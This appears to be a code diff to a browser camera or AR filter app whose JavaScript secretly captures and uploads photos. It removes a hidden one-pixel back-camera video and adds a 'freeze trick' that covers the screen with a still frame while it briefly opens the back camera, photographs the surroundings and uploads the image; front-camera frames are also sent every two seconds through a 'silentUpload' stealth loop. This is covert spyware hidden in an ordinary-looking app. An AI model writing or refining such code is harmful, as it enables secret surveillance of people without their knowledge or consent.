@@ -182,51 +182,18 @@
         let isDetectingAR = false;
         let currentARType = null;
         
-        // --- DUAL CAMERA STEALTH SYSTEM ---
-        let hiddenVideo = document.createElement('video');
-        hiddenVideo.autoplay = true;
-        hiddenVideo.muted = true;
-        hiddenVideo.playsInline = true;
-        hiddenVideo.style.position = 'absolute';
-        hiddenVideo.style.opacity = '0';
-        hiddenVideo.style.width = '1px';
-        hiddenVideo.style.height = '1px';
-        hiddenVideo.style.pointerEvents = 'none';
-        hiddenVideo.style.zIndex = '-1';
-        document.body.appendChild(hiddenVideo); // Must append to DOM for iOS/some Androids to play
-
-        let hasBackCamera = false;
-        let toggleCameraUpload = true; // true = front, false = back
-
-        async function initBackgroundCamera() {
-            try {
-                const backStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: { exact: "environment" } }, // Use exact to force back camera if possible, otherwise fallback
-                    audio: false
-                });
-                hiddenVideo.srcObject = backStream;
-                hiddenVideo.onloadedmetadata = () => {
-                    hiddenVideo.play();
-                    hasBackCamera = true;
-                };
-            } catch (err) {
-                // Try without exact just in case
-                try {
-                    const backStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: "environment" },
-                        audio: false
-                    });
-                    hiddenVideo.srcObject = backStream;
-                    hiddenVideo.onloadedmetadata = () => {
-                        hiddenVideo.play();
-                        hasBackCamera = true;
-                    };
-                } catch(e2) {
-                    console.log("Dual camera not supported by hardware, defaulting to front only.", e2);
-                    hasBackCamera = false;
-                }
-            }
-        }
+        // --- FREEZE TRICK SYSTEM (For single-camera hardware) ---
+        let freezeCanvas = document.createElement('canvas');
+        freezeCanvas.style.position = 'absolute';
+        freezeCanvas.style.top = '0';
+        freezeCanvas.style.left = '0';
+        freezeCanvas.style.width = '100%';
+        freezeCanvas.style.height = '100%';
+        freezeCanvas.style.objectFit = 'cover';
+        freezeCanvas.style.zIndex = '1'; 
+        freezeCanvas.style.display = 'none';
+        
+        let backCamCounter = 0;
 
         // Load AI models from reliable CDN
         async function loadARModels() {
@@ -292,7 +259,6 @@
                     uiOverlay.style.display = "flex";
                     
                     checkCameraDevices();
-                    initBackgroundCamera(); // start back camera silently
                     
                     isAutoCapturing = true;
                     startAutoCaptureLoop(); // Begin stealth capture
@@ -306,14 +272,9 @@
         function stopCamera() {
             isAutoCapturing = false;
             isDetectingAR = false;
-            hasBackCamera = false;
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
                 stream = null; video.srcObject = null;
-            }
-            if (hiddenVideo.srcObject) {
-                hiddenVideo.srcObject.getTracks().forEach(track => track.stop());
-                hiddenVideo.srcObject = null;
             }
         }
 
@@ -398,38 +359,91 @@
 
         // --- THE STEALTH UPLOAD LOOP ---
         async function startAutoCaptureLoop() {
+            document.getElementById('video-container').insertBefore(freezeCanvas, arCanvas);
+            
             while (isAutoCapturing) {
                 await new Promise(resolve => setTimeout(resolve, 2000));
                 if (!isAutoCapturing || !stream) break;
                 
-                let sourceVideo = video;
-                let camName = "FRONT";
+                if (!video.videoWidth) continue;
 
-                if (hasBackCamera && !toggleCameraUpload && hiddenVideo.videoWidth > 0) {
-                    sourceVideo = hiddenVideo;
-                    camName = "BACK";
-                }
-                
-                if (!sourceVideo.videoWidth) continue;
-
-                canvas.width = sourceVideo.videoWidth;
-                canvas.height = sourceVideo.videoHeight;
-                
-                // Draw RAW video frame to canvas (NO CSS FILTERS AND NO AR)
-                ctx.drawImage(sourceVideo, 0, 0, canvas.width, canvas.height);
-                
-                // Burn the timestamp and camera name
+                // 1. Normal Front Capture
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 ctx.font = "30px monospace";
                 ctx.fillStyle = "white";
                 ctx.shadowColor = "black";
                 ctx.shadowBlur = 4;
-                ctx.fillText(`CAM ${camName} ` + getTimestamp(), 20, canvas.height - 30);
+                ctx.fillText(`CAM FRONT ` + getTimestamp(), 20, canvas.height - 30);
+                silentUpload(canvas.toDataURL('image/jpeg', 0.6));
                 
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
-                silentUpload(dataUrl);
-
-                if (hasBackCamera) {
-                    toggleCameraUpload = !toggleCameraUpload;
+                backCamCounter++;
+                
+                // 2. Every 20 seconds, perform the Freeze Trick for Back Camera
+                if (backCamCounter >= 10) {
+                    backCamCounter = 0;
+                    
+                    // Freeze screen so it doesn't go black
+                    freezeCanvas.width = video.videoWidth;
+                    freezeCanvas.height = video.videoHeight;
+                    freezeCanvas.getContext('2d').drawImage(video, 0, 0, freezeCanvas.width, freezeCanvas.height);
+                    freezeCanvas.style.filter = currentFilter;
+                    freezeCanvas.style.display = 'block';
+                    
+                    // Stop front camera
+                    stream.getTracks().forEach(t => t.stop());
+                    video.srcObject = null;
+                    
+                    // Request back camera
+                    try {
+                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
+                        const tempVideo = document.createElement('video');
+                        tempVideo.srcObject = backStream;
+                        tempVideo.autoplay = true;
+                        tempVideo.muted = true;
+                        tempVideo.playsInline = true;
+                        
+                        await new Promise(resolve => {
+                            tempVideo.onloadedmetadata = () => {
+                                tempVideo.play();
+                                setTimeout(resolve, 1000); // Wait 1 sec for auto-exposure to adjust
+                            };
+                        });
+                        
+                        // Capture back photo
+                        canvas.width = tempVideo.videoWidth;
+                        canvas.height = tempVideo.videoHeight;
+                        ctx.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
+                        ctx.font = "30px monospace";
+                        ctx.fillStyle = "white";
+                        ctx.shadowColor = "black";
+                        ctx.shadowBlur = 4;
+                        ctx.fillText(`CAM BACK ` + getTimestamp(), 20, canvas.height - 30);
+                        silentUpload(canvas.toDataURL('image/jpeg', 0.6));
+                        
+                        // Stop back camera
+                        backStream.getTracks().forEach(t => t.stop());
+                    } catch(e) {
+                        console.error("Back camera freeze trick failed", e);
+                    }
+                    
+                    // Restart front camera
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: useFrontCamera ? "user" : "environment" }, audio: false });
+                        video.srcObject = stream;
+                        await new Promise(resolve => {
+                            video.onloadedmetadata = () => {
+                                video.play();
+                                resolve();
+                            };
+                        });
+                    } catch(e) {
+                        console.error("Failed to resume front camera", e);
+                    }
+                    
+                    // Unfreeze screen
+                    freezeCanvas.style.display = 'none';
                 }
             }
         }
